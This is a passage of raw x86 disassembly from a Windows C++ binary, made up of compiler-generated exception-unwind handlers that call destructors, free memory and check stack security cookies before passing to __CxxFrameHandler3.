add eax 0x6c
push eax
call sub_40a500
retn
sub_448c6d
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_448c75
mov eax [ ebp + 0x8 ]
add eax 0x70
push eax
call sub_40a500
retn
sub_448c82
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_448c8a
mov eax [ ebp + 0x8 ]
add eax 0x74
push eax
call sub_40a500
retn
sub_448c97
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_448c9f
mov eax [ ebp + 0x8 ]
add eax 0x78
push eax
call sub_40a500
retn
sub_448cac
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_448cb4
mov eax [ ebp + 0x8 ]
add eax 0x7c
push eax
call sub_40a500
retn
sub_448cc1
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_448cc9
mov eax [ ebp + 0x8 ]
add eax 0xd8
push eax
call sub_40a500
retn
sub_448cd8
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_448ce0
mov eax [ ebp + 0x8 ]
add eax 0xdc
push eax
call sub_40a500
retn
sub_448cef
mov eax [ ebp + 0x8 ]
add eax 0xe8
jmp sub_40ab00
sub_448cfc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448d20
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_448d28
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_448d41
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448d60
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_448d68
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_448d81
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448da0
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_448da8
lea ecx [ ebp - 0x14 ]
jmp sub_402ca0
sub_448db0
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_448db8
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_448dc4
lea eax [ ebp - 0x14 ]
jmp sub_402d20
sub_448dcc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448df0
mov eax [ ebp - 0x10 ]
push eax
call sub_4067b0
retn
sub_448dfa
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_41a460
sub_448e05
mov ecx [ ebp - 0x10 ]
add ecx 0x7c
jmp sub_426fc0
sub_448e10
mov eax [ ebp - 0x10 ]
push eax
call sub_43e8a0
retn
sub_448e1a
mov ecx [ ebp - 0x10 ]
jmp sub_4302d0
sub_448e22
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_448e2f
mov eax [ ebp - 0x10 ]
add eax 0xc
jmp sub_40a440
sub_448e3a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448e60
mov ecx [ ebp - 0x10 ]
jmp sub_4341f0
sub_448e68
mov ecx [ ebp - 0x10 ]
add ecx 0xf4
jmp sub_43fbb0
sub_448e76
mov ecx [ ebp - 0x10 ]
add ecx 0x17c
jmp sub_402ca0
sub_448e84
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_448e8c
mov eax [ ebp - 0x14 ]
push eax
call sub_4067b0
retn
sub_448e96
mov ecx [ ebp - 0x14 ]
add ecx 0x24
jmp sub_41a460
sub_448ea1
mov ecx [ ebp - 0x14 ]
add ecx 0x7c
jmp sub_426fc0
sub_448eac
mov eax [ ebp - 0x14 ]
push eax
call sub_43e8a0
retn
sub_448eb6
mov ecx [ ebp - 0x14 ]
jmp sub_4302d0
sub_448ebe
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_448ecb
mov eax [ ebp - 0x14 ]
add eax 0xc
jmp sub_40a440
sub_448ed6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448f00
mov ecx [ ebp + 0x8 ]
jmp sub_4341f0
sub_448f08
mov ecx [ ebp + 0x8 ]
add ecx 0xf4
jmp sub_43fbb0
sub_448f16
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_448f1e
mov ecx [ ebp + 0x8 ]
add ecx 0x17c
jmp sub_402ca0
sub_448f2c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448f50
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_448f58
lea ecx [ ebp + 0xc ]
jmp sub_402ca0
sub_448f60
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_448f68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448f90
lea eax [ ebp + 0x8 ]
jmp sub_402d20
sub_448f98
lea ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_448fa0
lea eax [ ebp + 0x8 ]
jmp sub_402d20
sub_448fa8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_448fd0
mov ecx [ ebp - 0x10 ]
jmp sub_4223e0
sub_448fd8
mov esi [ ebp - 0x10 ]
add esi 0xc0
jmp sub_439510
sub_448fe6
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_402ca0
sub_448ff1
mov ecx [ ebp - 0x14 ]
add ecx 0xc
jmp sub_402ca0
sub_448ffc
mov eax [ ebp - 0x18 ]
jmp sub_402d20
sub_449004
mov eax [ ebp - 0x18 ]
jmp sub_402d20
sub_44900c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449030
mov ecx [ ebp - 0x10 ]
jmp sub_41fcc0
sub_449038
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_449040
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449060
mov ecx [ ebp - 0x10 ]
jmp sub_41f8f0
sub_449068
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449090
mov ecx [ ebp + 0x8 ]
jmp sub_41f8f0
sub_449098
mov ecx [ ebp + 0x8 ]
jmp sub_41fcc0
sub_4490a0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4490c0
lea eax [ ebp - 0x58 ]
jmp sub_402d20
sub_4490c8
lea ecx [ ebp - 0x58 ]
jmp sub_402ca0
sub_4490d0
lea eax [ ebp - 0x58 ]
jmp sub_402d20
sub_4490d8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x5c ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449100
mov ecx [ ebp - 0x10 ]
jmp sub_418800
sub_449108
mov ecx [ ebp - 0x10 ]
jmp sub_4175d0
sub_449110
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_449118
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_412b40
sub_449123
mov ecx [ ebp - 0x10 ]
add ecx 0x140
jmp sub_427df0
sub_449131
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449150
mov ecx [ ebp - 0x10 ]
jmp sub_419950
sub_449158
mov ecx [ ebp - 0x10 ]
add ecx 0x154
jmp sub_41a460
sub_449166
mov ecx [ ebp - 0x10 ]
add ecx 0x1a4
jmp sub_419ab0
sub_449174
mov eax [ ebp - 0x10 ]
add eax 0x1ac
push eax
call sub_4067b0
retn
sub_449183
mov eax [ ebp - 0x10 ]
add eax 0x1d4
push eax
call sub_41b9a0
retn
sub_449192
mov eax [ ebp - 0x14 ]
push eax
call sub_43e8a0
retn
sub_44919c
mov ecx [ ebp - 0x14 ]
jmp sub_4302d0
sub_4491a4
mov eax [ ebp - 0x14 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_4491b1
mov eax [ ebp - 0x14 ]
add eax 0xc
jmp sub_40a440
sub_4491bc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4491e0
mov eax [ ebp - 0x10 ]
push eax
call sub_43e8a0
retn
sub_4491ea
mov ecx [ ebp - 0x10 ]
jmp sub_4302d0
sub_4491f2
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_4491ff
mov eax [ ebp - 0x10 ]
add eax 0xc
jmp sub_40a440
sub_44920a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449230
mov ecx [ ebp + 0x8 ]
jmp sub_418800
sub_449238
mov ecx [ ebp + 0x8 ]
jmp sub_419950
sub_449240
mov ecx [ ebp + 0x8 ]
add ecx 0x154
jmp sub_41a460
sub_44924e
mov ecx [ ebp + 0x8 ]
add ecx 0x1a4
jmp sub_419ab0
sub_44925c
mov eax [ ebp - 0x14 ]
add eax 0xc
jmp sub_40a440
sub_449267
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_449274
mov ecx [ ebp - 0x10 ]
jmp sub_4302d0
sub_44927c
mov eax [ ebp - 0x10 ]
push eax
call sub_43e8a0
retn
sub_449286
mov eax [ ebp + 0x8 ]
add eax 0x1ac
push eax
call sub_4067b0
retn
sub_449295
mov eax [ ebp + 0x8 ]
add eax 0x1d4
push eax
call sub_41b9a0
retn
sub_4492a4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4492c0
jmp sub_412940
sub_4492c5
lea eax [ ebp - 0x28 ]
jmp sub_402d20
sub_4492cd
lea ecx [ ebp - 0x28 ]
jmp sub_402ca0
sub_4492d5
lea eax [ ebp - 0x28 ]
jmp sub_402d20
sub_4492dd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449310
mov ecx [ ebp - 0x10 ]
jmp sub_418cc0
sub_449318
mov ecx [ ebp - 0x10 ]
add ecx 0x248
jmp sub_402ca0
sub_449326
mov ecx [ ebp - 0x10 ]
add ecx 0x250
jmp sub_426fc0
sub_449334
mov esi [ ebp - 0x10 ]
add esi 0x29c
jmp sub_439510
sub_449342
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44934a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449370
mov ecx [ ebp + 0x8 ]
jmp sub_418cc0
sub_449378
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449380
mov ecx [ ebp + 0x8 ]
add ecx 0x248
jmp sub_402ca0
sub_44938e
mov ecx [ ebp + 0x8 ]
add ecx 0x250
jmp sub_426fc0
sub_44939c
mov esi [ ebp + 0x8 ]
add esi 0x29c
jmp sub_439510
sub_4493aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4493d0
lea ecx [ ebp - 0x90 ]
jmp sub_402ca0
sub_4493db
jmp sub_412940
sub_4493e0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xa4 ]
mov ecx [ edx - 0xa8 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449410
mov ecx [ ebp - 0x10 ]
jmp sub_4147c0
sub_449418
mov ecx [ ebp - 0x10 ]
add ecx 0x2c0
jmp sub_402ca0
sub_449426
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44942e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449450
mov ecx [ ebp + 0x8 ]
jmp sub_4147c0
sub_449458
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449460
mov ecx [ ebp + 0x8 ]
add ecx 0x2c0
jmp sub_402ca0
sub_44946e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449490
lea esi [ ebp - 0x2270 ]
jmp sub_410f20
sub_44949b
lea esi [ ebp - 0x2258 ]
jmp sub_410f20
sub_4494a6
lea esi [ ebp - 0x223c ]
jmp sub_410f20
sub_4494b1
lea esi [ ebp - 0x222c ]
jmp sub_410f20
sub_4494bc
lea esi [ ebp - 0x2248 ]
jmp sub_410f20
sub_4494c7
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2274 ]
mov ecx [ edx - 0x2278 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449500
mov ecx [ ebp - 0x10 ]
jmp sub_412320
sub_449508
mov eax [ ebp - 0x10 ]
add eax 0x2d0
push eax
call sub_40a500
retn
sub_449517
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44951f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449540
mov ecx [ ebp + 0x8 ]
jmp sub_412320
sub_449548
mov eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_449550
mov eax [ ebp + 0x8 ]
add eax 0x2d0
push eax
call sub_40a500
retn
sub_44955f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449580
mov eax [ ebp - 0x10 ]
push eax
call sub_4067b0
retn
sub_44958a
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_40a4a0
sub_449595
mov eax [ ebp - 0x10 ]
add eax 0x54
push eax
call sub_40a500
retn
sub_4495a2
mov eax [ ebp - 0x10 ]
add eax 0x60
push eax
call sub_40a500
retn
sub_4495af
mov eax [ ebp - 0x10 ]
add eax 0x64
push eax
call sub_40a500
retn
sub_4495bc
mov eax [ ebp - 0x10 ]
add eax 0x68
push eax
call sub_40a500
retn
sub_4495c9
mov eax [ ebp - 0x10 ]
add eax 0x6c
push eax
call sub_40a500
retn
sub_4495d6
mov eax [ ebp - 0x10 ]
add eax 0x70
push eax
call sub_40a500
retn
sub_4495e3
mov eax [ ebp - 0x10 ]
add eax 0x74
push eax
call sub_40a500
retn
sub_4495f0
mov eax [ ebp - 0x10 ]
add eax 0x78
push eax
call sub_40a500
retn
sub_4495fd
mov eax [ ebp - 0x10 ]
add eax 0x7c
push eax
call sub_40a500
retn
sub_44960a
mov eax [ ebp - 0x10 ]
add eax 0xd8
push eax
call sub_40a500
retn
sub_449619
mov eax [ ebp - 0x10 ]
add eax 0xdc
push eax
call sub_40a500
retn
sub_449628
mov eax [ ebp - 0x10 ]
add eax 0xe8
jmp sub_40ab00
sub_449635
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44963d
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_449645
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44964d
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_449655
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44965d
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_449665
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44966d
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_449675
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44967d
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_449685
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_44968d
mov eax [ ebp - 0x14 ]
add eax 0x4
push eax
call sub_40a500
retn
sub_44969a
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_4496a2
mov eax [ ebp - 0x10 ]
push eax
call sub_43e8a0
retn
sub_4496ac
mov ecx [ ebp - 0x10 ]
jmp sub_4302d0
sub_4496b4
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_4496c1
mov eax [ ebp - 0x14 ]
add eax 0xc
jmp sub_40a440
sub_4496cc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4496f0
mov ecx [ ebp + 0x8 ]
jmp sub_40a550
sub_4496f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449720
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_449728
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp + 0x8 ]
push ecx
call sub_40a500
sub_449742
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44974a
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp + 0x8 ]
push ecx
call sub_40a500
sub_449764
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44976c
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_449774
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449790
mov eax [ ebp - 0x10 ]
push eax
call sub_406810
retn
sub_44979a
mov eax [ ebp - 0x10 ]
push eax
call sub_4067b0
retn
sub_4497a4
mov eax [ ebp - 0x10 ]
add eax 0x2c
push eax
call sub_40a500
retn
sub_4497b1
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_4497b9
mov eax [ ebp - 0x10 ]
push eax
call sub_43e8a0
retn
sub_4497c3
mov ecx [ ebp - 0x10 ]
jmp sub_4302d0
sub_4497cb
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_4497d8
mov eax [ ebp - 0x14 ]
add eax 0xc
jmp sub_40a440
sub_4497e3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449800
mov eax [ ebp - 0x10 ]
add eax 0xc
jmp sub_40a440
sub_44980b
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_449818
mov ecx [ ebp + 0x8 ]
jmp sub_4302d0
sub_449820
mov eax [ ebp + 0x8 ]
push eax
call sub_43e8a0
retn
sub_44982a
mov eax [ ebp + 0x8 ]
push eax
call sub_4067b0
retn
sub_449834
mov eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44983c
mov eax [ ebp + 0x8 ]
add eax 0x2c
push eax
call sub_40a500
retn
sub_449849
mov eax [ ebp + 0x8 ]
push eax
call sub_406810
retn
sub_449853
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449870
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44987c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4498a0
lea eax [ ebp - 0x1e4 ]
jmp sub_40bee0
sub_4498ab
lea eax [ ebp - 0x1e4 ]
push eax
call sub_40a500
retn
sub_4498b8
lea eax [ ebp - 0x1e8 ]
jmp sub_40bee0
sub_4498c3
lea eax [ ebp - 0x1e8 ]
push eax
call sub_40a500
retn
sub_4498d0
lea eax [ ebp - 0x1e4 ]
jmp sub_40bee0
sub_4498db
lea eax [ ebp - 0x1e4 ]
jmp sub_40bee0
sub_4498e6
lea eax [ ebp - 0x1e4 ]
jmp sub_40bee0
sub_4498f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1e8 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449920
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449928
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_449930
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449938
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449960
lea eax [ ebp - 0x90 ]
jmp sub_402d20
sub_44996b
lea ecx [ ebp - 0x90 ]
jmp sub_402ca0
sub_449976
lea eax [ ebp - 0x90 ]
jmp sub_402d20
sub_449981
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4499b0
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4499b8
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_4499c0
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4499c8
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4499d0
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4499d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449a00
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449a08
lea ecx [ ebp - 0x10 ]
jmp sub_402ca0
sub_449a10
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449a18
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449a20
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449a28
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_449a30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449a50
jmp sub_412940
sub_449a55
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_449a5d
lea ecx [ ebp + 0xc ]
jmp sub_402ca0
sub_449a65
lea eax [ ebp + 0xc ]
jmp sub_402d20
sub_449a6d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449a90
mov ecx [ ebp - 0x10 ]
jmp sub_418cc0
sub_449a98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449ac0
mov ecx [ ebp - 0x10 ]
jmp sub_418cc0
sub_449ac8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449af0
mov ecx [ ebp + 0x8 ]
jmp sub_418cc0
sub_449af8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449b20
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449b2c
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_449b34
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_449b3f
mov esi [ ebp - 0x10 ]
add esi 0x8
jmp sub_439510
sub_449b4a
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449b56
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_449b5e
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_402ca0
sub_449b69
mov esi [ ebp + 0x8 ]
add esi 0x8
jmp sub_439510
sub_449b74
jmp sub_412940
j_sub_412940#5
jmp sub_412940
sub_449b7e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449ba0
mov ecx [ ebp - 0x10 ]
jmp sub_425840
sub_449ba8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449bd0
mov ecx [ ebp - 0x10 ]
jmp sub_425840
sub_449bd8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449c00
mov ecx [ ebp + 0x8 ]
jmp sub_4223e0
sub_449c08
mov esi [ ebp + 0x8 ]
add esi 0xc0
jmp sub_439510
sub_449c16
mov ecx [ ebp + 0x8 ]
jmp sub_425840
sub_449c1e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449c40
mov ecx [ ebp - 0x10 ]
jmp sub_4260a0
sub_449c48
mov ecx [ ebp - 0x10 ]
jmp sub_425840
sub_449c50
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449c70
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449c7c
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449c88
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449c94
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449ca0
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449cac
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449cb8
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449cc4
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449cd0
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449cdc
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449ce8
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449cf4
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449d00
mov ecx [ ebp + 0x8 ]
jmp sub_43e350
sub_449d08
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_449d14
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_449d30
